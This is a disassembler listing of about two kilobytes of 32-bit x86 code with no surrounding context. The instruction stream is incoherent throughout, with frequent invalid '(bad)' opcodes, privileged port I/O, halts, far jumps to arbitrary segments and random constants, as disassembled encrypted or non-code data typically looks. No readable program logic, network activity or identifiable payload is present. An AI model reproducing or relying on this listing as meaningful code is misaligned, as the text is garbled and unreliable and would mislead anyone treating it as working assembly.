  416684:	xlat   BYTE PTR ds:[ebx]
  416685:	push   esp
  416686:	test   al,0xcd
  416688:	xchg   ebp,eax
  416689:	mov    edx,0x100a2953
  41668e:	lahf   
  41668f:	rcl    DWORD PTR [edx+0x6a590a6a],0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x4166cc
  4166ae:	(bad)  
  4166af:	jbe    0x41667e
  4166b1:	pop    esp
  4166b2:	adc    bh,BYTE PTR [edi+0x70]
  4166b5:	mov    ecx,0x9a70707e
  4166ba:	pop    ss
  4166bb:	hlt    
  4166bc:	xor    bh,dl
  4166be:	jb     0x41669c
  4166c0:	scas   al,BYTE PTR es:[edi]
  4166c1:	clc    
  4166c2:	or     ebp,esi
  4166c4:	cmp    cl,al
  4166c6:	xor    DWORD PTR [edi],ebp
  4166c8:	xor    BYTE PTR [esi+0x1ee6491e],dl
  4166ce:	mov    ebp,0xfbe1d7fc
  4166d3:	scas   eax,DWORD PTR es:[edi]
  4166d4:	outs   dx,BYTE PTR ds:[esi]
  4166d5:	mov    edx,0x934c1784
  4166da:	je     0x41670d
  4166dc:	inc    ebp
  4166dd:	fcom   QWORD PTR [edx-0x5b051666]
  4166e3:	cld    
  4166e4:	int    0x6e
  4166e6:	push   esi
  4166e7:	sub    DWORD PTR [esi-0x74],0x3552c0b9
  4166ee:	mov    bh,0xca
  4166f0:	or     eax,0x4310dfb
  4166f5:	sub    bh,BYTE PTR [ebx+0x11]
  4166f8:	dec    ebp
  4166f9:	sub    eax,0x4422cd23
  4166fe:	in     eax,dx
  4166ff:	sub    al,0x73
  416701:	or     al,bl
  416703:	mov    WORD PTR ds:0xb0a86371,gs
  416709:	mov    ch,0x51
  41670b:	in     eax,0x31
  41670d:	fwait
  41670e:	pop    ss
  41670f:	mov    ds:0x4b22d443,al
  416715:	mul    ecx
  416717:	xchg   ebx,eax
  416718:	adc    BYTE PTR [edx+0x21],bh
  41671b:	and    ebx,DWORD PTR [ecx+eax*1]
  41671e:	pop    ebx
  41671f:	xlat   BYTE PTR ds:[ebx]
  416720:	adc    al,0x24
  416722:	js     0x4166a6
  416724:	ror    DWORD PTR [esi],1
  416726:	fld    st(1)
  416728:	xor    ecx,DWORD PTR [ebp+0x52]
  41672b:	int    0xb9
  41672d:	adc    DWORD PTR [ebx+edi*1+0x1f363d17],esi
  416734:	iret   
  416735:	xor    eax,0x2b1d84a0
  41673a:	dec    ecx
  41673b:	(bad)
  416741:	xlat   BYTE PTR ds:[ebx]
  416742:	nop
  416743:	pop    es
  416744:	dec    edi
  416745:	cmc    
  416746:	cmp    eax,0x14462d93
  41674b:	dec    eax
  41674c:	cmp    bh,BYTE PTR [esi+0x49b99643]
  416752:	sbb    DWORD PTR [edx],edi
  416754:	xor    eax,eax
  416756:	jae    0x4166ec
  416758:	dec    esp
  416759:	into   
  41675a:	test   BYTE PTR [esi+0x3a],cl
  41675d:	adc    eax,0x420fe5c8
  416762:	in     eax,dx
  416763:	lock fmul DWORD PTR [edx]
  416766:	mov    DWORD PTR ds:0x9e5842cf,ebx
  41676c:	and    ch,BYTE PTR [edi]
  41676e:	sbb    al,0x5f
  416770:	inc    esp
  416771:	jno    0x41676f
  416773:	lahf   
  416774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416775:	loop   0x416744
  416777:	sbb    BYTE PTR [esi],0xfc
  41677a:	out    0xc3,eax
  41677c:	cli    
  41677d:	pop    es
  41677e:	icebp  
  41677f:	cdq    
  416780:	dec    edx
  416781:	data16 xor BYTE PTR [esi-0x31],bl
  416785:	inc    ecx
  416786:	mov    edx,0x10ed7c2a
  41678b:	shl    BYTE PTR [ebx],cl
  41678d:	jle    0x4167e9
  41678f:	push   edi
  416790:	push   es
  416791:	aad    0x9b
  416793:	pop    ebp
  416794:	mov    ds:0xde6827d,al
  416799:	sub    eax,0x66099f9a
  41679e:	les    eax,FWORD PTR [esi-0x45]
  4167a1:	xlat   BYTE PTR ds:[ebx]
  4167a2:	cli    
  4167a3:	mov    al,0x4f
  4167a5:	inc    ebp
  4167a6:	pop    edx
  4167a7:	pop    esp
  4167a8:	add    eax,0x2926bc6e
  4167ad:	pushf  
  4167ae:	inc    ebp
  4167af:	mov    DWORD PTR [ebp-0x1a211784],esp
  4167b5:	add    cl,BYTE PTR [eax-0x134bf45b]
  4167bb:	sbb    esi,ebp
  4167bd:	outs   dx,BYTE PTR ds:[esi]
  4167be:	jns    0x41675e
  4167c0:	mov    cl,0x3f
  4167c2:	or     al,0x4b
  4167c4:	xor    al,0x76
  4167c6:	daa    
  4167c7:	jae    0x416767
  4167c9:	cmp    al,0x16
  4167cb:	data16 data16 rcr BYTE PTR [eax+0x71],0xbb
  4167d1:	(bad)
  4167d4:	pop    ss
  4167d5:	cmp    eax,0x153bed2b
  4167da:	sub    bh,bh
  4167dc:	scas   eax,DWORD PTR es:[edi]
  4167dd:	in     eax,0xa2
  4167df:	scas   eax,DWORD PTR es:[edi]
  4167e0:	push   edi
  4167e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167e2:	inc    eax
  4167e3:	pop    es
  4167e4:	in     al,0x2c
  4167e6:	(bad)  
  4167e7:	jl     0x41679a
  4167e9:	data16 fimul DWORD PTR [edx]
  4167ec:	xchg   ebx,eax
  4167ed:	in     al,0x54
  4167ef:	xchg   ebx,eax
  4167f0:	js     0x4167f1
  4167f2:	xchg   esp,eax
  4167f3:	cli    
  4167f4:	jle    0x4167f7
  4167f6:	mov    edi,0x28c37c1d
  4167fb:	adc    ebx,DWORD PTR [eax+edx*2]
  4167fe:	fwait
  4167ff:	jmp    0x4d30:0x6ee941a9
  416806:	(bad)  
  416807:	mov    ch,0xf3
  416809:	outs   dx,BYTE PTR ds:[esi]
  41680a:	sbb    edx,DWORD PTR [edx]
  41680c:	adc    al,0x1e
  41680e:	scas   eax,DWORD PTR es:[edi]
  41680f:	xchg   esi,eax
  416810:	mov    eax,ds:0xd550b0c3
  416815:	cs scas eax,DWORD PTR es:[edi]
  416817:	ret    0x3efd
  41681a:	mov    edx,0x2481fbe3
  41681f:	mov    edx,0x6e2cc6da
  416824:	shl    DWORD PTR [eax-0x44],1
  416827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416829:	push   0x7da06716
  41682e:	shl    DWORD PTR [edi+0xb],0xca
  416832:	loope  0x4167cb
  416834:	push   eax
  416835:	loop   0x416823
  416837:	lahf   
  416838:	mov    ebp,0x162100c
  41683d:	pop    esp
  41683e:	rcr    DWORD PTR [ebx+0x612a0326],cl
  416844:	iret   
  416845:	mov    ah,0x3b
  416847:	mov    bh,0x7a
  416849:	mov    cl,0x44
  41684b:	jmp    0xf78f:0x76fbc7c9
  416852:	adc    BYTE PTR [ebx+0x62],0x1b
  416856:	stc    
  416857:	cld    
  416858:	hlt    
  416859:	dec    ebp
  41685a:	push   ecx
  41685b:	push   ebx
  41685c:	arpl   WORD PTR [ebx],di
  41685e:	mov    bh,0x71
  416860:	cmp    ah,BYTE PTR [esi-0x8]
  416863:	scas   al,BYTE PTR es:[edi]
  416864:	(bad)  
  416865:	jb     0x41688b
  416867:	cmp    BYTE PTR [ebx-0x67],bl
  41686a:	lahf   
  41686b:	mov    ?,WORD PTR [eax-0x5e]
  41686e:	pop    esi
  41686f:	ja     0x41681e
  416871:	and    al,0xc2
  416873:	inc    esi
  416874:	mov    cl,0x25
  416876:	fdiv   st(3),st
  416878:	push   eax
  416879:	cmc    
  41687a:	pop    edx
  41687b:	push   edi
  41687c:	jp     0x416883
  41687e:	popa   
  41687f:	dec    ebp
  416880:	(bad)  
  416881:	int3   
  416882:	sahf   
  416883:	and    esi,ecx
  416885:	pop    esp
  416886:	in     eax,0x6c
  416888:	mov    cl,0x93
  41688a:	push   0x1a
  41688c:	push   0xf54d966a
  416891:	sub    DWORD PTR [edi+0x14],edx
  416894:	rol    BYTE PTR [ebx+0x17],1
  416897:	jbe    0x41683b
  416899:	jmp    0x41682a
  41689b:	ins    BYTE PTR es:[edi],dx
  41689c:	jae    0x416915
  41689e:	loope  0x4168d5
  4168a0:	push   ecx
  4168a1:	xor    DWORD PTR [ebp-0x12],edx
  4168a4:	ins    BYTE PTR es:[edi],dx
  4168a5:	jns    0x4168bf
  4168a7:	mov    al,ds:0x47b6ecfd
  4168ac:	xor    DWORD PTR [esp+eiz*4+0xc0a6711],ebp
  4168b3:	imul   ebp,DWORD PTR [ebx],0x30
  4168b6:	jb     0x41690c
  4168b8:	fwait
  4168b9:	mov    ds:0x8d99a22f,al
  4168be:	mov    BYTE PTR [ebp+0x6a304e30],ah
  4168c4:	aam    0x57
  4168c6:	in     eax,0x83
  4168c8:	pop    ds
  4168c9:	rdpmc  
  4168cb:	push   ss
  4168cc:	inc    edi
  4168cd:	les    edi,FWORD PTR [edi+0x44]
  4168d0:	xchg   esp,eax
  4168d1:	jb     0x4168ba
  4168d3:	ins    BYTE PTR es:[edi],dx
  4168d4:	dec    eax
  4168d5:	add    BYTE PTR [ebp+0x430131ff],0xe1
  4168dc:	xor    DWORD PTR [eax],ebx
  4168de:	push   edx
  4168df:	rcl    BYTE PTR [ecx+ebp*1-0x51],0x2e
  4168e4:	or     cl,bl
  4168e6:	dec    edi
  4168e7:	jo     0x4168ca
  4168e9:	xlat   BYTE PTR ds:[ebx]
  4168ea:	mov    esp,0xd948ef37
  4168ef:	ss retf 
  4168f1:	in     al,dx
  4168f2:	and    DWORD PTR [eax],eax
  4168f4:	ss sbb eax,0x7250bb31
  4168fa:	mov    cl,0x9c
  4168fc:	cmp    BYTE PTR [ecx],cl
  4168fe:	shl    BYTE PTR [edx+0x73],0x30
  416902:	(bad)  
  416903:	sbb    DWORD PTR [edi+ecx*4-0x7f],ebx
  416907:	sbb    al,0x69
  416909:	xchg   esi,edi
  41690b:	loopne 0x4168e0
  41690d:	push   edx
  41690e:	ins    BYTE PTR es:[edi],dx
  41690f:	mov    gs,ecx
  416911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416912:	xlat   BYTE PTR ds:[ebx]
  416913:	or     edi,ebp
  416915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416916:	test   dl,al
  416918:	jmp    0x41689b
  41691a:	push   ebx
  41691b:	retf   0x5475
  41691e:	scas   eax,DWORD PTR es:[edi]
  41691f:	ins    BYTE PTR es:[edi],dx
  416920:	cmp    BYTE PTR ds:[eax],bh
  416923:	in     al,0x70
  416925:	cmp    esp,ebp
  416927:	jecxz  0x4168e0
  416929:	mov    cs,WORD PTR [edi+0x16d5bbd7]
  41692f:	mov    dh,0xd7
  416931:	xchg   esp,eax
  416932:	dec    ecx
  416933:	(bad)  [esi]
  416935:	jb     0x416910
  416937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416938:	test   eax,0x7b7f37d0
  41693d:	jnp    0x4168fe
  41693f:	pop    ecx
  416940:	cdq    
  416941:	or     DWORD PTR [ebx-0x1264c559],edi
  416947:	and    ebp,DWORD PTR [edx+0xb3a7e0]
  41694d:	mov    edi,0xb0f1ab8e
  416952:	repnz lea eax,[ecx]
  416955:	push   DWORD PTR [edi-0x3c]
  416958:	dec    esi
  416959:	push   ebp
  41695a:	std    
  41695b:	pop    esi
  41695c:	push   ebx
  41695d:	dec    edx
  41695e:	dec    DWORD PTR [ecx+0x6e]
  416961:	dec    esp
  416962:	adc    ah,bl
  416964:	in     eax,dx
  416965:	pop    ebp
  416966:	mov    eax,0xbe1511e1
  41696b:	dec    esi
  41696c:	push   edx
  41696d:	(bad)  
  41696f:	jmp    0x4169cd
  416971:	xor    ebx,DWORD PTR [esi]
  416973:	cdq    
  416974:	call   0x369f:0xdb0760b2
  41697b:	xor    eax,0x7f293d2f
  416980:	xchg   ebx,ecx
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	xor    DWORD PTR [edx],eax
  416995:	pop    ds
  416996:	xor    ah,BYTE PTR [ebp-0x468f80e1]
  41699c:	jle    0x416a0e
  41699e:	jo     0x4169f8
  4169a0:	add    eax,0x2b42fcd6
  4169a5:	loop   0x4169f2
  4169a7:	imul   DWORD PTR [ecx+0x21941018]
  4169ad:	and    al,0x53
  4169af:	or     cl,BYTE PTR [edx+0x2fb1a695]
  4169b5:	adc    al,0x75
  4169b7:	or     dl,al
  4169b9:	call   0xfbdb:0x3d9d665f
  4169c0:	pusha  
  4169c1:	fwait
  4169c2:	test   eax,0xb812bd04
  4169c7:	adc    ch,BYTE PTR [ebp+0x58]
  4169ca:	pop    esi
  4169cb:	mov    esi,0x3948b98
  4169d0:	jge    0x416973
  4169d2:	fldln2 
  4169d4:	add    al,BYTE PTR [esi-0x4cad998a]
  4169da:	fucomip st,st(2)
  4169dc:	adc    al,0xd4
  4169de:	xchg   esp,eax
  4169df:	pop    eax
  4169e0:	mov    bl,0x8b
  4169e2:	outs   dx,BYTE PTR ds:[esi]
  4169e3:	cmp    eax,0x9434f8ef
  4169e8:	mov    esp,0x82e54d44
  4169ed:	or     al,0xea
  4169ef:	add    eax,0x4115db73
  4169f4:	inc    edx
  4169f5:	sub    ebx,DWORD PTR [esi+0x32]
  4169f8:	aas    
  4169f9:	out    0xed,eax
  4169fb:	pusha  
  4169fc:	fist   DWORD PTR [edi]
  4169fe:	mov    ch,0x16
  416a00:	xor    al,0x8a
  416a02:	add    edi,DWORD PTR ds:0x9089391d
  416a08:	jge    0x4169b6
  416a0a:	xor    edx,DWORD PTR [edx]
  416a0c:	or     al,0xcf
  416a0e:	xor    eax,esi
  416a10:	cmp    ebp,DWORD PTR [eax]
  416a12:	inc    ecx
  416a13:	rol    BYTE PTR [edx+eiz*4-0x17],cl
  416a17:	rcr    DWORD PTR [eax+0x590609fe],1
  416a1d:	lods   eax,DWORD PTR ds:[esi]
  416a1e:	mov    ah,0x8a
  416a20:	(bad)  
  416a21:	(bad)  
  416a22:	fcomp  st(3)
  416a24:	cmc    
  416a25:	sbb    BYTE PTR [eax],dh
  416a27:	cs dec ebp
  416a29:	pop    ebp
  416a2a:	test   esp,edi
  416a2c:	(bad)  
  416a2d:	push   eax
  416a2e:	gs ja  0x4169c7
  416a31:	sar    DWORD PTR [ecx+0x72787fa4],cl
  416a37:	stos   DWORD PTR es:[edi],eax
  416a38:	pop    eax
  416a39:	test   DWORD PTR ds:0x1bd5f439,edx
  416a3f:	into   
  416a40:	push   ds
  416a41:	sbb    ebx,DWORD PTR [esi+0x569d9d3a]
  416a47:	fwait
  416a48:	loopne 0x416a4c
  416a4a:	push   cs
  416a4b:	xor    dl,ah
  416a4d:	cmp    al,0xe7
  416a4f:	leave  
  416a50:	cli    
  416a51:	das    
  416a52:	out    0x17,al
  416a54:	push   ebx
  416a55:	mov    ebx,0x9f7970f7
  416a5a:	loop   0x416a67
  416a5c:	add    di,dx
  416a5f:	fstp   TBYTE PTR [ebx+edx*8+0x308e4444]
  416a66:	rcr    BYTE PTR [eax+0xc],cl
  416a69:	jae    0x416a6f
  416a6b:	stc    
  416a6c:	dec    esp
  416a6d:	xchg   ebp,eax
  416a6e:	xor    BYTE PTR [esi-0x56bdc4c8],dl
  416a74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a75:	xor    ecx,0xffffffab
  416a78:	mov    ah,0xb8
  416a7a:	xor    al,0x3
  416a7c:	adc    al,0x61
  416a7e:	inc    esp
  416a7f:	jb     0x416acb
  416a81:	adc    bl,BYTE PTR [eax-0x27]
  416a84:	pop    ebp
  416a85:	jbe    0x3f8c67b9
  416a8b:	inc    ebp
  416a8c:	test   BYTE PTR [eax],ch
  416a8e:	jmp    0x575d6e34
  416a93:	sbb    BYTE PTR gs:[ebx+0xf98dfb2],dh
  416a9a:	jo     0x416a1d
  416a9c:	dec    esi
  416a9d:	mov    dh,0x7b
  416a9f:	cs (bad) 
  416aa1:	jle    0x416a8d
  416aa3:	pop    ss
  416aa4:	pop    ebp
  416aa5:	call   DWORD PTR [ecx-0x382e03d8]
  416aab:	jp     0x416ae5
  416aad:	xchg   esp,eax
  416aae:	jge    0x416afc
  416ab0:	ins    DWORD PTR es:[edi],dx
  416ab1:	daa    
  416ab2:	loopne 0x416b05
  416ab4:	inc    esp
  416ab5:	inc    ebp
  416ab6:	jb     0x416a48
  416ab8:	xchg   BYTE PTR [esi+0x62],ah
  416abb:	or     ebp,DWORD PTR [esi+0x3b]
  416abe:	pop    eax
  416abf:	pop    ecx
  416ac0:	add    esi,edi
  416ac2:	ja     0x416aff
  416ac4:	xor    ebp,DWORD PTR [ebx-0x4497a1ab]
  416aca:	retf   0xa877
  416acd:	sbb    BYTE PTR [edx-0x6cf54b12],bl
  416ad3:	or     DWORD PTR [ebp-0x1bff354a],0x27
  416ada:	inc    edx
  416adb:	jb     0x416ac5
  416add:	pop    ss
  416ade:	sbb    eax,0xb4bffe68
  416ae4:	icebp  
  416ae5:	rcl    BYTE PTR [eax+eiz*2-0x51],cl
  416ae9:	sar    BYTE PTR [edi-0x6dd4fa23],1
  416aef:	xchg   esi,eax
  416af0:	xchg   edi,eax
  416af1:	push   0x2e9be221
  416af6:	xchg   ebp,eax
  416af7:	int    0xf8
  416af9:	jp     0x416ae9
  416afb:	test   BYTE PTR [esi-0x6886b1ad],al
  416b01:	cmp    ch,BYTE PTR [eax]
  416b03:	lds    edx,FWORD PTR [esi+0x1a]
  416b06:	cwde   
  416b07:	push   esp
  416b08:	sub    eax,0x7dc54101
  416b0d:	in     eax,0xaa
  416b0f:	and    al,dl
  416b11:	imul   ebp,DWORD PTR [esp],0x53
  416b15:	push   0xffffffec
  416b17:	xor    al,0x5e
  416b19:	out    0x6e,al
  416b1b:	rcl    DWORD PTR [esi+ebp*2+0x25],cl
  416b1f:	mov    ah,0x96
  416b21:	sub    eax,0x8a37bbef
  416b26:	jb     0x416b5b
  416b28:	cmp    esp,DWORD PTR [esi]
  416b2a:	jg     0x416b63
  416b2c:	mov    ds:0xfd52aaea,eax
  416b31:	(bad)  
  416b33:	shl    DWORD PTR [edi],cl
  416b35:	mov    edi,0x819a1c67
  416b3a:	je     0x416aec
  416b3c:	jl     0x416b5c
  416b3e:	or     al,0xa5
  416b40:	test   BYTE PTR [ebp-0x62],cl
  416b43:	nop
  416b44:	jmp    0xbb61:0xbef1e07a
  416b4b:	inc    ecx
  416b4c:	pop    es
  416b4d:	jno    0x416b31
  416b4f:	sub    esi,ecx
  416b51:	ja     0x416b52
  416b53:	sahf   
  416b54:	(bad)  
  416b55:	push   eax
  416b57:	clc    
  416b58:	enter  0x3553,0x5
  416b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b5d:	mov    BYTE PTR [eax],0x79
  416b60:	or     eax,0x6eeb6285
  416b65:	or     BYTE PTR [edx-0x31e50c23],bh
  416b6b:	jle    0x416baf
  416b6d:	or     edx,esi
  416b6f:	xchg   esi,eax
  416b70:	push   sp
  416b72:	dec    esp
  416b73:	dec    ebp
  416b74:	and    eax,0x211754c9
  416b79:	pop    eax
  416b7a:	mov    al,ds:0xd98ca21b
  416b7f:	aas    
  416b80:	mov    ch,0xfc
  416b82:	jne    0x416b58
  416b84:	sbb    al,dl
  416b86:	sbb    BYTE PTR [edx+0x39],ch
  416b89:	popf   
  416b8a:	and    eax,0x9665d98e
  416b8f:	push   0x7ec714fa
  416b94:	mov    al,0xa2
  416b96:	lds    esp,FWORD PTR [ecx+0x46]
  416b99:	les    esp,FWORD PTR [ebp-0x22]
  416b9c:	test   DWORD PTR ds:0x674be7ba,0xeb3b7574
  416ba6:	call   0x4075:0x84de0ed9
  416bad:	xchg   edi,eax
  416bae:	or     BYTE PTR gs:[ebx+0x7b],bl
  416bb2:	push   ebx
  416bb3:	dec    ebx
  416bb4:	outs   dx,BYTE PTR ds:[esi]
  416bb5:	dec    esp
  416bb6:	jno    0x416b51
  416bb8:	in     al,dx
  416bb9:	inc    edi
  416bba:	rol    DWORD PTR [ecx+eax*4-0x48d16e54],cl
  416bc1:	ficomp DWORD PTR [eax+0x7d]
  416bc4:	lods   eax,DWORD PTR ds:[esi]
  416bc5:	or     bh,BYTE PTR [edi-0x2c]
  416bc8:	call   0x7e8698e0
  416bcd:	pop    esi
  416bce:	clc    
  416bcf:	(bad)  
  416bd0:	imul   BYTE PTR [edi+esi*2+0x1a]
  416bd4:	lods   eax,DWORD PTR ds:[esi]
  416bd5:	push   esi
  416bd6:	push   0xffffffca
  416bd8:	loop   0x416c0e
  416bda:	push   eax
  416bdb:	aad    0x91
  416bdd:	out    0xb8,eax
  416bdf:	lods   al,BYTE PTR ds:[esi]
  416be0:	pop    esi
  416be1:	xchg   ecx,ebp
  416be3:	sub    bh,BYTE PTR [esi-0x6]
  416be6:	mov    cl,BYTE PTR [eax-0x54]
  416be9:	out    0xdd,eax
  416beb:	jne    0x416bcc
  416bed:	cmp    DWORD PTR [ebp-0x4d],0xffffff98
  416bf1:	inc    esi
  416bf2:	ins    DWORD PTR es:[edi],dx
  416bf3:	dec    esi
  416bf4:	repz popf 
  416bf6:	inc    esi
  416bf7:	addr16 aam 0xf7
  416bfa:	int3   
  416bfb:	jmp    0x416c0f
  416bfd:	(bad)  [edi-0xd]
  416c00:	inc    eax
  416c01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c02:	mov    esp,0x2a3f1c79
  416c07:	addr16 call 0x8fe276d4
  416c0d:	es dec ecx
  416c0f:	sbb    eax,0x50dbe1b0
  416c14:	inc    esi
  416c15:	cld    
  416c16:	pop    ebx
  416c17:	lods   eax,DWORD PTR ds:[esi]
  416c18:	adc    eax,0xea460b65
  416c1d:	jecxz  0x416c8d
  416c1f:	push   ss
  416c20:	jae    0x416be4
  416c22:	push   0xffffffba
  416c24:	xlat   BYTE PTR ds:[ebx]
  416c25:	xchg   edx,eax
  416c26:	fst    DWORD PTR [edx-0x74baeed7]
  416c2c:	push   edi
  416c2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c2e:	arpl   WORD PTR [ecx+eiz*1-0x6c9dd298],sp
  416c35:	mov    ecx,ebx
  416c37:	(bad)  
  416c38:	pop    esi
  416c39:	in     eax,0x3
  416c3b:	or     ch,ah
  416c3d:	mov    bl,0xeb
  416c3f:	mov    edx,0xdd6c6d66
  416c44:	addr16 in eax,0x81
  416c47:	jge    0x416ca8
  416c49:	jae    0x416ca6
  416c4b:	in     eax,0x30
  416c4d:	add    edi,DWORD PTR [ebp+0x7]
  416c50:	mov    edi,fs
  416c52:	xlat   BYTE PTR ds:[ebx]
  416c53:	and    eax,0x7fa74056
  416c58:	sbb    ch,BYTE PTR [edi-0x25]
  416c5b:	mov    ebx,0x7030c530
  416c60:	inc    edx
  416c61:	pop    ss
  416c62:	fild   WORD PTR [edx-0x74b6effa]
  416c68:	inc    ebp
  416c69:	in     al,0xe9
  416c6b:	fild   WORD PTR [edx]
  416c6d:	add    BYTE PTR [eax],al
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	es inc esi
  416c7d:	loop   0x416cb2
  416c7f:	out    dx,al
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416c75
  416c88:	dec    ebx
  416c89:	jmp    DWORD PTR [edx-0x5d]
  416c8c:	(bad)  
  416c8d:	xchg   BYTE PTR [esi],ch
  416c8f:	xchg   ecx,eax
  416c90:	xor    ah,dh
  416c92:	scas   al,BYTE PTR es:[edi]
  416c93:	pop    ss
  416c94:	and    bh,BYTE PTR [eax+0x22]
  416c97:	and    cl,BYTE PTR [ebp-0x1a]
  416c9a:	push   0xa6b14703
  416c9f:	ins    BYTE PTR es:[edi],dx
  416ca0:	push   esp
  416ca1:	cwde   
  416ca2:	ja     0x416c28
  416ca4:	push   ss
  416ca5:	sti    
  416ca6:	mov    ch,0xb5
  416ca8:	and    al,0x22
  416caa:	loop   0x416cf8
  416cac:	les    edx,FWORD PTR [ebp+edi*2-0x6f4d9872]
  416cb3:	push   ebp
  416cb4:	mov    bh,0x2a
  416cb6:	div    DWORD PTR [ebp-0x5b5eadd3]
  416cbc:	push   edx
  416cbd:	ret    
  416cbe:	fwait
  416cbf:	adc    eax,0x2e7238a1
  416cc4:	arpl   WORD PTR [ebp-0x16a21255],dx
  416cca:	push   eax
  416ccb:	xor    al,0xbb
  416ccd:	xor    eax,0x4b8590af
  416cd2:	pushf  
  416cd3:	or     esp,edi
  416cd5:	mov    esi,0xc3262d08
  416cda:	cmp    bh,0xb4
  416cdd:	dec    edx
  416cde:	ss dec esi
  416ce0:	adc    eax,DWORD PTR [edx-0x50]
  416ce3:	outs   dx,DWORD PTR ds:[esi]
  416ce4:	adc    DWORD PTR [eax-0x41],ecx
  416ce7:	pop    edi
  416ce8:	(bad)  
  416ceb:	lock xor DWORD PTR [ebp-0x79],edx
  416cef:	jmp    ebp
  416cf1:	not    cl
  416cf3:	frstor [edx+ecx*4-0x2c]
  416cf7:	mov    dl,0x2d
  416cf9:	jp     0x416cd1
  416cfb:	repz in eax,0xef
  416cfe:	dec    edx
  416cff:	(bad)  
  416d00:	pop    ss
  416d01:	mov    dh,0xe
  416d03:	out    0x22,al
  416d05:	sub    al,0xa7
  416d07:	div    BYTE PTR [esi-0x4ab1495]
  416d0d:	and    al,0x40
  416d0f:	pop    edi
  416d10:	push   0xffffff89
  416d12:	(bad)
  416d15:	ss push ds
  416d17:	pop    es
  416d18:	add    eax,0xe7f9da2
  416d1d:	push   esi
  416d1e:	cmp    DWORD PTR [ebp+0x640642e5],0xf52bbe68
  416d28:	mov    WORD PTR [esi+0x0],ds
  416d2b:	jmp    0x416ce3
  416d2d:	iret   
  416d2e:	shl    DWORD PTR [ecx-0x42ed11c2],0x92
  416d35:	daa    
  416d36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d37:	loope  0x416d6a
  416d39:	in     al,0x9c
  416d3b:	aas    
  416d3c:	xor    al,0xb2
  416d3e:	es ror edi,1
  416d41:	icebp  
  416d42:	out    dx,al
  416d43:	clc    
  416d44:	neg    DWORD PTR [edx-0x7cc7694e]
  416d4a:	jb     0x416d24
  416d4c:	xchg   ebx,eax
  416d4d:	dec    ebp
  416d4e:	shr    dh,1
  416d50:	popf   
  416d51:	inc    ebx
  416d52:	je     0x416d78
  416d54:	fstp   DWORD PTR [esi-0x8]
  416d57:	mov    edx,0x8a026c3d
  416d5c:	inc    edx
  416d5d:	sub    cl,BYTE PTR [edi-0x3377941f]
  416d63:	push   esp
  416d64:	pop    ecx
  416d65:	xchg   edx,eax
  416d66:	stos   DWORD PTR es:[edi],eax
  416d67:	fidiv  WORD PTR [edi-0x44]
  416d6a:	leave  
  416d6b:	sub    eax,0x4f8916bb
  416d70:	loope  0x416cff
  416d72:	add    eax,0x4456dc4b
  416d77:	nop
  416d78:	pushf  
  416d79:	jp     0x416dd8
  416d7b:	(bad)  
  416d7d:	push   edi
  416d7e:	jb     0x416d5f
  416d80:	adc    al,dl
  416d82:	mov    eax,0xb90a0917
  416d87:	nop
  416d88:	adc    eax,0x5544e70b
  416d8d:	adc    DWORD PTR [esi],ebp
  416d8f:	mov    WORD PTR [ebx+0x6cb07be2],ds
  416d95:	int3   
  416d96:	scas   eax,DWORD PTR es:[edi]
  416d97:	cs pop ecx
  416d99:	das    
  416d9a:	sbb    eax,0xb6037e4f
  416d9f:	dec    ebx
  416da0:	dec    esi
  416da1:	mov    esp,DWORD PTR [esp+ebp*1-0x36643780]
  416da8:	mov    bh,0x39
  416daa:	inc    eax
  416dab:	mov    esp,ebp
  416dad:	icebp  
  416dae:	push   ebx
  416daf:	mov    al,0xba
  416db1:	nop
  416db2:	lahf   
  416db3:	rcl    BYTE PTR [edx+0xe],cl
  416db6:	imul   al
  416db8:	pop    ss
  416db9:	lods   eax,DWORD PTR ds:[esi]
  416dba:	cs stc 
  416dbc:	enter  0xbb8b,0x22
  416dc0:	add    cl,BYTE PTR [edx-0x119d2211]
  416dc6:	jle    0x416dff
  416dc8:	push   ecx
  416dc9:	add    dl,BYTE PTR [eax+eiz*2+0x3]
  416dcd:	pop    ecx
  416dce:	jmp    0x4da4:0x6ea4baa
  416dd5:	xchg   esi,eax
  416dd6:	xor    ah,BYTE PTR [eax+0x6]
  416dd9:	jmp    0x7ec5:0x8b3e8e7b
  416de0:	xchg   ebx,eax
  416de1:	push   edx
  416de2:	mov    bh,0x34
  416de4:	sub    dl,dl
  416de6:	mov    WORD PTR [ecx+0x0],ss
  416de9:	adc    DWORD PTR [esi],ecx
  416deb:	add    eax,0xf1094989
  416df0:	mov    eax,0x992f7da7
  416df5:	jae    0x416d9e
  416df7:	pop    es
  416df8:	sub    eax,0xc4087a76
  416dfd:	mov    WORD PTR [ecx-0x76],fs
  416e00:	mov    dl,0xe5
  416e02:	inc    esi
  416e03:	sar    BYTE PTR [esi],0x64
  416e06:	mov    dl,0xe0
  416e08:	mov    dl,0xc3
  416e0a:	repz pop ebx
  416e0c:	mov    ah,BYTE PTR [ebx+0x39b854c8]
  416e12:	adc    eax,0xf51eb433
  416e17:	sti    
